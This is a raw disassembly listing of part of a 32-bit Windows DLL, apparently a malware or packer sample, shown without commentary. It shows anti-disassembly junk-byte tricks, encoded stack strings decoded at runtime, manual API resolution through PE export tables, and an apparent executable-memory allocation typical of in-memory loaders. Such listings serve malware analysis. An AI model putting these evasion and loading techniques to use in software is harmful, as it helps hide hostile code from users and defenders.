100071e3:	8b ff                	mov    %edi,%edi
100071e5:	55                   	push   %ebp
100071e6:	8b ec                	mov    %esp,%ebp
100071e8:	5d                   	pop    %ebp
100071e9:	e9 84 f9 ff ff       	jmp    0x10006b72
100071ee:	8b ff                	mov    %edi,%edi
100071f0:	55                   	push   %ebp
100071f1:	8b ec                	mov    %esp,%ebp
100071f3:	56                   	push   %esi
100071f4:	8b 75 08             	mov    0x8(%ebp),%esi
100071f7:	85 f6                	test   %esi,%esi
100071f9:	75 0f                	jne    0x1000720a
100071fb:	8b 4d 0c             	mov    0xc(%ebp),%ecx
100071fe:	e8 d9 00 00 00       	call   0x100072dc
10007203:	33 c0                	xor    %eax,%eax
10007205:	e9 a8 00 00 00       	jmp    0x100072b2
1000720a:	53                   	push   %ebx
1000720b:	33 db                	xor    %ebx,%ebx
1000720d:	66 39 1e             	cmp    %bx,(%esi)
10007210:	75 25                	jne    0x10007237
10007212:	8b 75 0c             	mov    0xc(%ebp),%esi
10007215:	39 5e 0c             	cmp    %ebx,0xc(%esi)
10007218:	75 11                	jne    0x1000722b
1000721a:	6a 01                	push   $0x1
1000721c:	8b ce                	mov    %esi,%ecx
1000721e:	e8 92 00 00 00       	call   0x100072b5
10007223:	85 c0                	test   %eax,%eax
10007225:	0f 85 86 00 00 00    	jne    0x100072b1
1000722b:	8b 46 08             	mov    0x8(%esi),%eax
1000722e:	88 18                	mov    %bl,(%eax)
10007230:	33 c0                	xor    %eax,%eax
10007232:	89 5e 10             	mov    %ebx,0x10(%esi)
10007235:	eb 7a                	jmp    0x100072b1
10007237:	53                   	push   %ebx
10007238:	53                   	push   %ebx
10007239:	53                   	push   %ebx
1000723a:	53                   	push   %ebx
1000723b:	6a ff                	push   $0xffffffff
1000723d:	56                   	push   %esi
1000723e:	53                   	push   %ebx
1000723f:	ff 75 14             	push   0x14(%ebp)
10007242:	e8 3b 0a 00 00       	call   0x10007c82
10007247:	83 c4 20             	add    $0x20,%esp
1000724a:	85 c0                	test   %eax,%eax
1000724c:	75 16                	jne    0x10007264
1000724e:	ff 15 40 d0 00 10    	call   *0x1000d040
10007254:	50                   	push   %eax
10007255:	e8 86 e3 ff ff       	call   0x100055e0
1000725a:	59                   	pop    %ecx
1000725b:	e8 b6 e3 ff ff       	call   0x10005616
10007260:	8b 00                	mov    (%eax),%eax
10007262:	eb 4d                	jmp    0x100072b1
10007264:	57                   	push   %edi
10007265:	8b 7d 0c             	mov    0xc(%ebp),%edi
10007268:	3b 47 0c             	cmp    0xc(%edi),%eax
1000726b:	76 0c                	jbe    0x10007279
1000726d:	50                   	push   %eax
1000726e:	8b cf                	mov    %edi,%ecx
10007270:	e8 40 00 00 00       	call   0x100072b5
10007275:	85 c0                	test   %eax,%eax
10007277:	75 37                	jne    0x100072b0
10007279:	53                   	push   %ebx
1000727a:	53                   	push   %ebx
1000727b:	ff 77 0c             	push   0xc(%edi)
1000727e:	ff 77 08             	push   0x8(%edi)
10007281:	6a ff                	push   $0xffffffff
10007283:	56                   	push   %esi
10007284:	53                   	push   %ebx
10007285:	ff 75 14             	push   0x14(%ebp)
10007288:	e8 f5 09 00 00       	call   0x10007c82
1000728d:	83 c4 20             	add    $0x20,%esp
10007290:	85 c0                	test   %eax,%eax
10007292:	75 16                	jne    0x100072aa
10007294:	ff 15 40 d0 00 10    	call   *0x1000d040
1000729a:	50                   	push   %eax
1000729b:	e8 40 e3 55 8b       	call   0x9b5655e0
100072a0:	ec                   	in     (%dx),%al
100072a1:	53                   	push   %ebx
100072a2:	56                   	push   %esi
100072a3:	57                   	push   %edi
100072a4:	8b 75 0c             	mov    0xc(%ebp),%esi
100072a7:	8b 7d 08             	mov    0x8(%ebp),%edi
100072aa:	8b 4d 10             	mov    0x10(%ebp),%ecx
100072ad:	8b d9                	mov    %ecx,%ebx
100072af:	83 e1 03             	and    $0x3,%ecx
100072b2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
100072b4:	8b cb                	mov    %ebx,%ecx
100072b6:	c1 e9 02             	shr    $0x2,%ecx
100072b9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
100072bb:	8b 45 08             	mov    0x8(%ebp),%eax
100072be:	5f                   	pop    %edi
100072bf:	5e                   	pop    %esi
100072c0:	5b                   	pop    %ebx
100072c1:	5d                   	pop    %ebp
100072c2:	c3                   	ret
100072c3:	55                   	push   %ebp
100072c4:	8b ec                	mov    %esp,%ebp
100072c6:	51                   	push   %ecx
100072c7:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
100072cb:	56                   	push   %esi
100072cc:	57                   	push   %edi
100072cd:	8b 75 08             	mov    0x8(%ebp),%esi
100072d0:	8b 7d 0c             	mov    0xc(%ebp),%edi
100072d3:	ac                   	lods   %ds:(%esi),%al
100072d4:	ae                   	scas   %es:(%edi),%al
100072d5:	75 08                	jne    0x100072df
100072d7:	84 c0                	test   %al,%al
100072d9:	75 f8                	jne    0x100072d3
100072db:	33 c0                	xor    %eax,%eax
100072dd:	eb 09                	jmp    0x100072e8
100072df:	b8 01 00 00 00       	mov    $0x1,%eax
100072e4:	7c 02                	jl     0x100072e8
100072e6:	f7 d8                	neg    %eax
100072e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
100072eb:	8b 45 fc             	mov    -0x4(%ebp),%eax
100072ee:	5f                   	pop    %edi
100072ef:	5e                   	pop    %esi
100072f0:	c9                   	leave
100072f1:	c3                   	ret
100072f2:	ff 74 24 0c          	push   0xc(%esp)
100072f6:	ff 74 24 0c          	push   0xc(%esp)
100072fa:	ff 54 24 0c          	call   *0xc(%esp)
100072fe:	c3                   	ret
100072ff:	50                   	push   %eax
10007300:	8b 44 24 04          	mov    0x4(%esp),%eax
10007304:	83 c0 04             	add    $0x4,%eax
10007307:	50                   	push   %eax
10007308:	c2 08 00             	ret    $0x8
1000730b:	50                   	push   %eax
1000730c:	60                   	pusha
1000730d:	e8 ed ff ff ff       	call   0x100072ff
10007312:	c2 04 00             	ret    $0x4
10007315:	c3                   	ret
10007316:	61                   	popa
10007317:	83 ec f8             	sub    $0xfffffff8,%esp
1000731a:	8b 44 24 fc          	mov    -0x4(%esp),%eax
1000731e:	83 c0 02             	add    $0x2,%eax
10007321:	89 44 24 fc          	mov    %eax,-0x4(%esp)
10007325:	8b 44 24 f8          	mov    -0x8(%esp),%eax
10007329:	83 ec 04             	sub    $0x4,%esp
1000732c:	c3                   	ret
1000732d:	50                   	push   %eax
1000732e:	8b 44 24 04          	mov    0x4(%esp),%eax
10007332:	83 c0 04             	add    $0x4,%eax
10007335:	50                   	push   %eax
10007336:	8b 44 24 04          	mov    0x4(%esp),%eax
1000733a:	c2 08 00             	ret    $0x8
1000733d:	8b 54 24 04          	mov    0x4(%esp),%edx
10007341:	80 7a 03 01          	cmpb   $0x1,0x3(%edx)
10007345:	75 04                	jne    0x1000734b
10007347:	8d 42 04             	lea    0x4(%edx),%eax
1000734a:	c3                   	ret
1000734b:	8d 42 04             	lea    0x4(%edx),%eax
1000734e:	53                   	push   %ebx
1000734f:	8b c8                	mov    %eax,%ecx
10007351:	8a 5a 02             	mov    0x2(%edx),%bl
10007354:	84 db                	test   %bl,%bl
10007356:	74 02                	je     0x1000735a
10007358:	30 19                	xor    %bl,(%ecx)
1000735a:	8a 19                	mov    (%ecx),%bl
1000735c:	f6 d3                	not    %bl
1000735e:	84 db                	test   %bl,%bl
10007360:	88 19                	mov    %bl,(%ecx)
10007362:	74 03                	je     0x10007367
10007364:	41                   	inc    %ecx
10007365:	eb ea                	jmp    0x10007351
10007367:	c6 42 03 01          	movb   $0x1,0x3(%edx)
1000736b:	5b                   	pop    %ebx
1000736c:	c3                   	ret
1000736d:	8b 4c 24 08          	mov    0x8(%esp),%ecx
10007371:	56                   	push   %esi
10007372:	57                   	push   %edi
10007373:	33 ff                	xor    %edi,%edi
10007375:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
10007379:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
1000737d:	85 f6                	test   %esi,%esi
1000737f:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
10007383:	76 23                	jbe    0x100073a8
10007385:	8b 48 08             	mov    0x8(%eax),%ecx
10007388:	85 c9                	test   %ecx,%ecx
1000738a:	75 03                	jne    0x1000738f
1000738c:	8b 48 10             	mov    0x10(%eax),%ecx
1000738f:	8b 50 0c             	mov    0xc(%eax),%edx
10007392:	39 54 24 0c          	cmp    %edx,0xc(%esp)
10007396:	72 08                	jb     0x100073a0
10007398:	03 d1                	add    %ecx,%edx
1000739a:	39 54 24 0c          	cmp    %edx,0xc(%esp)
1000739e:	72 0a                	jb     0x100073aa
100073a0:	47                   	inc    %edi
100073a1:	83 c0 28             	add    $0x28,%eax
100073a4:	3b fe                	cmp    %esi,%edi
100073a6:	72 dd                	jb     0x10007385
100073a8:	33 c0                	xor    %eax,%eax
100073aa:	5f                   	pop    %edi
100073ab:	5e                   	pop    %esi
100073ac:	c3                   	ret
100073ad:	ff 74 24 08          	push   0x8(%esp)
100073b1:	ff 74 24 08          	push   0x8(%esp)
100073b5:	e8 b3 ff ff ff       	call   0x1000736d
100073ba:	59                   	pop    %ecx
100073bb:	59                   	pop    %ecx
100073bc:	8b c8                	mov    %eax,%ecx
100073be:	85 c9                	test   %ecx,%ecx
100073c0:	75 01                	jne    0x100073c3
100073c2:	c3                   	ret
100073c3:	8b 41 14             	mov    0x14(%ecx),%eax
100073c6:	2b 41 0c             	sub    0xc(%ecx),%eax
100073c9:	03 44 24 04          	add    0x4(%esp),%eax
100073cd:	03 44 24 0c          	add    0xc(%esp),%eax
100073d1:	c3                   	ret
100073d2:	55                   	push   %ebp
100073d3:	8b ec                	mov    %esp,%ebp
100073d5:	83 ec 18             	sub    $0x18,%esp
100073d8:	53                   	push   %ebx
100073d9:	56                   	push   %esi
100073da:	57                   	push   %edi
100073db:	e8 2b ff ff ff       	call   0x1000730b
100073e0:	c3                   	ret
100073e1:	d0 e8                	shr    $1,%al
100073e3:	46                   	inc    %esi
100073e4:	ff                   	(bad)
100073e5:	ff                   	(bad)
100073e6:	ff e7                	jmp    *%edi
100073e8:	eb 80                	jmp    0x1000736a
100073ea:	2d e8 3d ff ff       	sub    $0xffff3de8,%eax
100073ef:	ff                   	(bad)
100073f0:	3c 96                	cmp    $0x96,%al
100073f2:	69 95 8b 7d 08 8b 77 	imul   $0xf7033c77,-0x74f78275(%ebp),%edx
100073f9:	3c 03 f7 
100073fc:	56                   	push   %esi
100073fd:	8b 5e 78             	mov    0x78(%esi),%ebx
10007400:	53                   	push   %ebx
10007401:	e8 67 ff ff ff       	call   0x1000736d
10007406:	59                   	pop    %ecx
10007407:	85 c0                	test   %eax,%eax
10007409:	59                   	pop    %ecx
1000740a:	0f 84 a8 00 00 00    	je     0x100074b8
10007410:	57                   	push   %edi
10007411:	56                   	push   %esi
10007412:	53                   	push   %ebx
10007413:	e8 95 ff ff ff       	call   0x100073ad
10007418:	8b 76 78             	mov    0x78(%esi),%esi
1000741b:	33 c9                	xor    %ecx,%ecx
1000741d:	83 c4 0c             	add    $0xc,%esp
10007420:	3b f1                	cmp    %ecx,%esi
10007422:	0f 84 90 00 00 00    	je     0x100074b8
10007428:	8b 5c 3e 24          	mov    0x24(%esi,%edi,1),%ebx
1000742c:	8b 44 3e 20          	mov    0x20(%esi,%edi,1),%eax
10007430:	8b 55 0c             	mov    0xc(%ebp),%edx
10007433:	03 f7                	add    %edi,%esi
10007435:	03 df                	add    %edi,%ebx
10007437:	03 c7                	add    %edi,%eax
10007439:	8b 7e 1c             	mov    0x1c(%esi),%edi
1000743c:	89 45 e8             	mov    %eax,-0x18(%ebp)
1000743f:	03 7d 08             	add    0x8(%ebp),%edi
10007442:	c1 ea 10             	shr    $0x10,%edx
10007445:	66 85 d2             	test   %dx,%dx
10007448:	74 7d                	je     0x100074c7
1000744a:	89 4d fc             	mov    %ecx,-0x4(%ebp)
1000744d:	83 3f 00             	cmpl   $0x0,(%edi)
10007450:	74 5a                	je     0x100074ac
10007452:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
10007456:	89 45 f4             	mov    %eax,-0xc(%ebp)
10007459:	89 5d f8             	mov    %ebx,-0x8(%ebp)
1000745c:	e8 cc fe ff ff       	call   0x1000732d
10007461:	ed                   	in     (%dx),%eax
10007462:	2b c8                	sub    %eax,%ecx
10007464:	38 8b 45 f8 0f b7    	cmp    %cl,-0x48f007bb(%ebx)
1000746a:	00 3b                	add    %bh,(%ebx)
1000746c:	45                   	inc    %ebp
1000746d:	fc                   	cld
1000746e:	75 25                	jne    0x10007495
10007470:	8b 4d f4             	mov    -0xc(%ebp),%ecx
10007473:	8b 45 08             	mov    0x8(%ebp),%eax
10007476:	03 01                	add    (%ecx),%eax
10007478:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000747b:	e8 ad fe ff ff       	call   0x1000732d
10007480:	08 a2 3b dd ff 75    	or     %ah,0x75ffdd3b(%edx)
10007486:	0c ff                	or     $0xff,%al
10007488:	75 ec                	jne    0x10007476
1000748a:	e8 34 fe ff ff       	call   0x100072c3
1000748f:	59                   	pop    %ecx
10007490:	85 c0                	test   %eax,%eax
10007492:	59                   	pop    %ecx
10007493:	74 2a                	je     0x100074bf
10007495:	8b 46 18             	mov    0x18(%esi),%eax
10007498:	ff 45 f0             	incl   -0x10(%ebp)
1000749b:	83 45 f8 02          	addl   $0x2,-0x8(%ebp)
1000749f:	83 45 f4 04          	addl   $0x4,-0xc(%ebp)
100074a3:	48                   	dec    %eax
100074a4:	39 45 f0             	cmp    %eax,-0x10(%ebp)
100074a7:	76 b3                	jbe    0x1000745c
100074a9:	8b 45 e8             	mov    -0x18(%ebp),%eax
100074ac:	8b 4e 14             	mov    0x14(%esi),%ecx
100074af:	ff 45 fc             	incl   -0x4(%ebp)
100074b2:	49                   	dec    %ecx
100074b3:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
100074b6:	76 95                	jbe    0x1000744d
100074b8:	33 c0                	xor    %eax,%eax
100074ba:	5f                   	pop    %edi
100074bb:	5e                   	pop    %esi
100074bc:	5b                   	pop    %ebx
100074bd:	c9                   	leave
100074be:	c3                   	ret
100074bf:	8b 45 fc             	mov    -0x4(%ebp),%eax
100074c2:	8b 04 87             	mov    (%edi,%eax,4),%eax
100074c5:	eb 24                	jmp    0x100074eb
100074c7:	8b 46 10             	mov    0x10(%esi),%eax
100074ca:	8b d7                	mov    %edi,%edx
100074cc:	39 45 0c             	cmp    %eax,0xc(%ebp)
100074cf:	75 05                	jne    0x100074d6
100074d1:	83 3a 00             	cmpl   $0x0,(%edx)
100074d4:	75 0f                	jne    0x100074e5
100074d6:	8b 5e 14             	mov    0x14(%esi),%ebx
100074d9:	41                   	inc    %ecx
100074da:	40                   	inc    %eax
100074db:	83 c2 04             	add    $0x4,%edx
100074de:	4b                   	dec    %ebx
100074df:	3b cb                	cmp    %ebx,%ecx
100074e1:	76 e9                	jbe    0x100074cc
100074e3:	eb d3                	jmp    0x100074b8
100074e5:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
100074e8:	c1 e0 06             	shl    $0x6,%eax
100074eb:	03 45 08             	add    0x8(%ebp),%eax
100074ee:	eb ca                	jmp    0x100074ba
100074f0:	55                   	push   %ebp
100074f1:	8b ec                	mov    %esp,%ebp
100074f3:	81 ec c8 00 00 00    	sub    $0xc8,%esp
100074f9:	53                   	push   %ebx
100074fa:	56                   	push   %esi
100074fb:	57                   	push   %edi
100074fc:	e8 0a fe ff ff       	call   0x1000730b
10007501:	c3                   	ret
10007502:	e8 8b 45 10 33       	call   0x4310ba92
10007507:	db 3b                	fstpt  (%ebx)
10007509:	c3                   	ret
1000750a:	0f 84 34 06 00 00    	je     0x10007b44
10007510:	8b 70 3c             	mov    0x3c(%eax),%esi
10007513:	03 f0                	add    %eax,%esi
10007515:	e8 13 fe ff ff       	call   0x1000732d
1000751a:	7f 63                	jg     0x1000757f
1000751c:	ec                   	in     (%dx),%al
1000751d:	2d 0f b7 46 14       	sub    $0x1446b70f,%eax
10007522:	8d 7c 30 18          	lea    0x18(%eax,%esi,1),%edi
10007526:	0f b7 46 06          	movzwl 0x6(%esi),%eax
1000752a:	89 bd 40 ff ff ff    	mov    %edi,-0xc0(%ebp)
10007530:	8d 04 80             	lea    (%eax,%eax,4),%eax
10007533:	c1 e0 03             	shl    $0x3,%eax
10007536:	2b 45 10             	sub    0x10(%ebp),%eax
10007539:	03 c7                	add    %edi,%eax
1000753b:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
10007541:	89 45 f4             	mov    %eax,-0xc(%ebp)
10007544:	e8 e4 fd ff ff       	call   0x1000732d
10007549:	2b c1                	sub    %ecx,%eax
1000754b:	23 4a 66             	and    0x66(%edx),%ecx
1000754e:	8b 46 06             	mov    0x6(%esi),%eax
10007551:	66 3b c3             	cmp    %bx,%ax
10007554:	76 1b                	jbe    0x10007571
10007556:	8d 4f 0c             	lea    0xc(%edi),%ecx
10007559:	0f b7 d0             	movzwl %ax,%edx
1000755c:	8b 41 04             	mov    0x4(%ecx),%eax
1000755f:	8b 39                	mov    (%ecx),%edi
10007561:	03 c7                	add    %edi,%eax
10007563:	39 45 f4             	cmp    %eax,-0xc(%ebp)
10007566:	73 03                	jae    0x1000756b
10007568:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000756b:	83 c1 28             	add    $0x28,%ecx
1000756e:	4a                   	dec    %edx
1000756f:	75 eb                	jne    0x1000755c
10007571:	88 5d a8             	mov    %bl,-0x58(%ebp)
10007574:	88 5d a9             	mov    %bl,-0x57(%ebp)
10007577:	c6 45 aa 9d          	movb   $0x9d,-0x56(%ebp)
1000757b:	88 5d ab             	mov    %bl,-0x55(%ebp)
1000757e:	c6 45 ac 25          	movb   $0x25,-0x54(%ebp)
10007582:	c6 45 ad 07          	movb   $0x7,-0x53(%ebp)
10007586:	c6 45 ae 16          	movb   $0x16,-0x52(%ebp)
1000758a:	c6 45 af 31          	movb   $0x31,-0x51(%ebp)
1000758e:	c6 45 b0 1b          	movb   $0x1b,-0x50(%ebp)
10007592:	c6 45 b1 11          	movb   $0x11,-0x4f(%ebp)
10007596:	c6 45 b2 16          	movb   $0x16,-0x4e(%ebp)
1000759a:	c6 45 b3 07          	movb   $0x7,-0x4d(%ebp)
1000759e:	c6 45 b4 0f          	movb   $0xf,-0x4c(%ebp)
100075a2:	c6 45 b5 2b          	movb   $0x2b,-0x4b(%ebp)
100075a6:	c6 45 b6 0c          	movb   $0xc,-0x4a(%ebp)
100075aa:	c6 45 b7 04          	movb   $0x4,-0x49(%ebp)
100075ae:	c6 45 b8 0d          	movb   $0xd,-0x48(%ebp)
100075b2:	c6 45 b9 62          	movb   $0x62,-0x47(%ebp)
100075b6:	e8 72 fd ff ff       	call   0x1000732d
100075bb:	7d 8d                	jge    0x1000754a
100075bd:	25 f4 8d 45 a8       	and    $0xa8458df4,%eax
100075c2:	50                   	push   %eax
100075c3:	e8 75 fd ff ff       	call   0x1000733d
100075c8:	8b 7d 0c             	mov    0xc(%ebp),%edi
100075cb:	50                   	push   %eax
100075cc:	57                   	push   %edi
100075cd:	ff 75 08             	push   0x8(%ebp)
100075d0:	e8 1d fd ff ff       	call   0x100072f2
100075d5:	83 c4 10             	add    $0x10,%esp
100075d8:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
100075de:	51                   	push   %ecx
100075df:	ff d0                	call   *%eax
100075e1:	8b 45 f4             	mov    -0xc(%ebp),%eax
100075e4:	8b 8d 54 ff ff ff    	mov    -0xac(%ebp),%ecx
100075ea:	33 d2                	xor    %edx,%edx
100075ec:	f7 f1                	div    %ecx
100075ee:	33 d2                	xor    %edx,%edx
100075f0:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%ebp)
100075f6:	8b 45 f4             	mov    -0xc(%ebp),%eax
100075f9:	f7 f1                	div    %ecx
100075fb:	85 d2                	test   %edx,%edx
100075fd:	74 06                	je     0x10007605
100075ff:	ff 85 74 ff ff ff    	incl   -0x8c(%ebp)
10007605:	0f af 8d 74 ff ff ff 	imul   -0x8c(%ebp),%ecx
1000760c:	8d 45 d0             	lea    -0x30(%ebp),%eax
1000760f:	89 4d 0c             	mov    %ecx,0xc(%ebp)
10007612:	50                   	push   %eax
10007613:	88 5d d0             	mov    %bl,-0x30(%ebp)
10007616:	88 5d d1             	mov    %bl,-0x2f(%ebp)
10007619:	c6 45 d2 6a          	movb   $0x6a,-0x2e(%ebp)
1000761d:	88 5d d3             	mov    %bl,-0x2d(%ebp)
10007620:	c6 45 d4 c3          	movb   $0xc3,-0x2c(%ebp)
10007624:	c6 45 d5 fc          	movb   $0xfc,-0x2b(%ebp)
10007628:	c6 45 d6 e7          	movb   $0xe7,-0x2a(%ebp)
1000762c:	c6 45 d7 e1          	movb   $0xe1,-0x29(%ebp)
10007630:	c6 45 d8 e0          	movb   $0xe0,-0x28(%ebp)
10007634:	c6 45 d9 f4          	movb   $0xf4,-0x27(%ebp)
10007638:	c6 45 da f9          	movb   $0xf9,-0x26(%ebp)
1000763c:	c6 45 db d4          	movb   $0xd4,-0x25(%ebp)
10007640:	c6 45 dc f9          	movb   $0xf9,-0x24(%ebp)
10007644:	c6 45 dd f9          	movb   $0xf9,-0x23(%ebp)
10007648:	c6 45 de fa          	movb   $0xfa,-0x22(%ebp)
1000764c:	c6 45 df f6          	movb   $0xf6,-0x21(%ebp)
10007650:	c6 45 e0 95          	movb   $0x95,-0x20(%ebp)
10007654:	e8 e4 fc ff ff       	call   0x1000733d
10007659:	50                   	push   %eax
1000765a:	57                   	push   %edi
1000765b:	ff 75 08             	push   0x8(%ebp)
1000765e:	e8 8f fc ff ff       	call   0x100072f2
10007663:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
10007669:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000766c:	50                   	push   %eax
1000766d:	88 5d e4             	mov    %bl,-0x1c(%ebp)
10007670:	88 5d e5             	mov    %bl,-0x1b(%ebp)
10007673:	c6 45 e6 fb          	movb   $0xfb,-0x1a(%ebp)
10007677:	88 5d e7             	mov    %bl,-0x19(%ebp)
1000767a:	c6 45 e8 52          	movb   $0x52,-0x18(%ebp)
1000767e:	c6 45 e9 6d          	movb   $0x6d,-0x17(%ebp)
10007682:	c6 45 ea 76          	movb   $0x76,-0x16(%ebp)
10007686:	c6 45 eb 70          	movb   $0x70,-0x15(%ebp)
1000768a:	c6 45 ec 71          	movb   $0x71,-0x14(%ebp)
1000768e:	c6 45 ed 65          	movb   $0x65,-0x13(%ebp)
10007692:	c6 45 ee 68          	movb   $0x68,-0x12(%ebp)
10007696:	c6 45 ef 42          	movb   $0x42,-0x11(%ebp)
1000769a:	c6 45 f0 76          	movb   $0x76,-0x10(%ebp)
1000769e:	c6 45 f1 61          	movb   $0x61,-0xf(%ebp)
100076a2:	c6 45 f2 61          	movb   $0x61,-0xe(%ebp)
100076a6:	c6 45 f3 04          	movb   $0x4,-0xd(%ebp)
100076aa:	e8 8e fc ff ff       	call   0x1000733d
100076af:	50                   	push   %eax
100076b0:	57                   	push   %edi
100076b1:	ff 75 08             	push   0x8(%ebp)
100076b4:	e8 39 fc ff ff       	call   0x100072f2
100076b9:	83 c4 20             	add    $0x20,%esp
100076bc:	89 45 f4             	mov    %eax,-0xc(%ebp)
100076bf:	e8 69 fc ff ff       	call   0x1000732d
100076c4:	30 f4                	xor    %dh,%ah
100076c6:	a8 1d                	test   $0x1d,%al
100076c8:	8d 45 94             	lea    -0x6c(%ebp),%eax
100076cb:	88 5d 94             	mov    %bl,-0x6c(%ebp)
100076ce:	50                   	push   %eax
100076cf:	88 5d 95             	mov    %bl,-0x6b(%ebp)
100076d2:	c6 45 96 d2          	movb   $0xd2,-0x6a(%ebp)
100076d6:	88 5d 97             	mov    %bl,-0x69(%ebp)
100076d9:	c6 45 98 7b          	movb   $0x7b,-0x68(%ebp)
100076dd:	c6 45 99 44          	movb   $0x44,-0x67(%ebp)
100076e1:	c6 45 9a 5f          	movb   $0x5f,-0x66(%ebp)
100076e5:	c6 45 9b 59          	movb   $0x59,-0x65(%ebp)
100076e9:	c6 45 9c 58          	movb   $0x58,-0x64(%ebp)
100076ed:	c6 45 9d 4c          	movb   $0x4c,-0x63(%ebp)
100076f1:	c6 45 9e 41          	movb   $0x41,-0x62(%ebp)
100076f5:	c6 45 9f 7d          	movb   $0x7d,-0x61(%ebp)
100076f9:	c6 45 a0 5f          	movb   $0x5f,-0x60(%ebp)
100076fd:	c6 45 a1 42          	movb   $0x42,-0x5f(%ebp)
10007701:	c6 45 a2 59          	movb   $0x59,-0x5e(%ebp)
10007705:	c6 45 a3 48          	movb   $0x48,-0x5d(%ebp)
10007709:	c6 45 a4 4e          	movb   $0x4e,-0x5c(%ebp)
1000770d:	c6 45 a5 59          	movb   $0x59,-0x5b(%ebp)
10007711:	c6 45 a6 2d          	movb   $0x2d,-0x5a(%ebp)
10007715:	e8 23 fc ff ff       	call   0x1000733d
1000771a:	50                   	push   %eax
1000771b:	57                   	push   %edi
1000771c:	ff 75 08             	push   0x8(%ebp)
1000771f:	e8 ce fb ff ff       	call   0x100072f2
10007724:	89 85 3c ff ff ff    	mov    %eax,-0xc4(%ebp)
1000772a:	88 5d bc             	mov    %bl,-0x44(%ebp)
1000772d:	8d 45 bc             	lea    -0x44(%ebp),%eax
10007730:	88 5d bd             	mov    %bl,-0x43(%ebp)
10007733:	50                   	push   %eax
10007734:	c6 45 be fd          	movb   $0xfd,-0x42(%ebp)
10007738:	88 5d bf             	mov    %bl,-0x41(%ebp)
1000773b:	c6 45 c0 4e          	movb   $0x4e,-0x40(%ebp)
1000773f:	c6 45 c1 6d          	movb   $0x6d,-0x3f(%ebp)
10007743:	c6 45 c2 63          	movb   $0x63,-0x3e(%ebp)
10007747:	c6 45 c3 66          	movb   $0x66,-0x3d(%ebp)
1000774b:	c6 45 c4 4e          	movb   $0x4e,-0x3c(%ebp)
1000774f:	c6 45 c5 6b          	movb   $0x6b,-0x3b(%ebp)
10007753:	c6 45 c6 60          	movb   $0x60,-0x3a(%ebp)
10007757:	c6 45 c7 70          	movb   $0x70,-0x39(%ebp)
1000775b:	c6 45 c8 63          	movb   $0x63,-0x38(%ebp)
1000775f:	c6 45 c9 70          	movb   $0x70,-0x37(%ebp)
10007763:	c6 45 ca 7b          	movb   $0x7b,-0x36(%ebp)
10007767:	c6 45 cb 43          	movb   $0x43,-0x35(%ebp)
1000776b:	c6 45 cc 02          	movb   $0x2,-0x34(%ebp)
1000776f:	e8 c9 fb ff ff       	call   0x1000733d
10007774:	50                   	push   %eax
10007775:	57                   	push   %edi
10007776:	ff 75 08             	push   0x8(%ebp)
10007779:	e8 74 fb ff ff       	call   0x100072f2
1000777e:	83 c4 20             	add    $0x20,%esp
10007781:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%ebp)
10007787:	88 9d 7c ff ff ff    	mov    %bl,-0x84(%ebp)
1000778d:	88 9d 7d ff ff ff    	mov    %bl,-0x83(%ebp)
10007793:	c6 85 7e ff ff ff 7b 	movb   $0x7b,-0x82(%ebp)
1000779a:	88 9d 7f ff ff ff    	mov    %bl,-0x81(%ebp)
100077a0:	c6 45 80 c3          	movb   $0xc3,-0x80(%ebp)
100077a4:	c6 45 81 e1          	movb   $0xe1,-0x7f(%ebp)
100077a8:	c6 45 82 f0          	movb   $0xf0,-0x7e(%ebp)
100077ac:	c6 45 83 c9          	movb   $0xc9,-0x7d(%ebp)
100077b0:	c6 45 84 eb          	movb   $0xeb,-0x7c(%ebp)
100077b4:	c6 45 85 e0          	movb   $0xe0,-0x7b(%ebp)
100077b8:	c6 45 86 f1          	movb   $0xf1,-0x7a(%ebp)
100077bc:	c6 45 87 e8          	movb   $0xe8,-0x79(%ebp)
100077c0:	c6 45 88 e1          	movb   $0xe1,-0x78(%ebp)
100077c4:	c6 45 89 cc          	movb   $0xcc,-0x77(%ebp)
100077c8:	c6 45 8a e5          	movb   $0xe5,-0x76(%ebp)
100077cc:	c6 45 8b ea          	movb   $0xea,-0x75(%ebp)
100077d0:	c6 45 8c e0          	movb   $0xe0,-0x74(%ebp)
100077d4:	c6 45 8d e8          	movb   $0xe8,-0x73(%ebp)
100077d8:	c6 45 8e e1          	movb   $0xe1,-0x72(%ebp)
100077dc:	c6 45 8f c5          	movb   $0xc5,-0x71(%ebp)
100077e0:	c6 45 90 84          	movb   $0x84,-0x70(%ebp)
100077e4:	e8 44 fb ff ff       	call   0x1000732d
100077e9:	9b                   	fwait
100077ea:	3d 2f 7f 8d 85       	cmp    $0x858d7f2f,%eax
100077ef:	7c ff                	jl     0x100077f0
100077f1:	ff                   	(bad)
100077f2:	ff 50 e8             	call   *-0x18(%eax)
100077f5:	44                   	inc    %esp
100077f6:	fb                   	sti
100077f7:	ff                   	(bad)
100077f8:	ff 50 57             	call   *0x57(%eax)
100077fb:	ff 75 08             	push   0x8(%ebp)
100077fe:	e8 ef fa ff ff       	call   0x100072f2
10007803:	83 c4 10             	add    $0x10,%esp
10007806:	89 85 48 ff ff ff    	mov    %eax,-0xb8(%ebp)
1000780c:	6a 40                	push   $0x40
1000780e:	68 00 10 00 00       	push   $0x1000
10007813:	ff 75 0c             	push   0xc(%ebp)
10007816:	53                   	push   %ebx
10007817:	ff 95 78 ff ff ff    	call   *-0x88(%ebp)
1000781d:	8b f8                	mov    %eax,%edi
1000781f:	89 7d 0c             	mov    %edi,0xc(%ebp)
10007822:	e8 06 fb ff ff       	call   0x1000732d
10007827:	62 94 9e c7 3b fb 0f 	bound  %edx,0xffb3bc7(%esi,%ebx,4)
1000782e:	84 11                	test   %dl,(%ecx)
